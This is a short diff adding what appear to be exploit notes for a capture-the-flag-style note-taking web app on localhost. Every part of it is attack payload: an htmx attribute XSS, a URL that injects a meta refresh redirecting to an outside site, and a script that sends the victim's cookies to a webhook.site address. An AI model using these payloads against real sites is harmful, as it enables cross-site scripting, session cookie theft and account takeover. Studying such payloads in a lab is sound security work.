@@ -1,0 +1,12 @@
+create note:
+<i hx-on::load=alert(1)>
+
+client side redirection:
+http://localhost:8080/api/v1/note?value=a&path=%0a%0a%3cmeta%20http-equiv='refresh'%20content='0;url=https://exploit.com'%3e
+
+
+
+<script>
+    let WEBHOOK = "https://webhook.site/d106e135-ef1b-42d3-82d4-c89554fdd90d"
+    open("http://localhost:8080/note/8ea28877-5e54-45d2-9dc8-27be01a12a07", `location = "${WEBHOOK}?"+document.coookie`)
+</script>
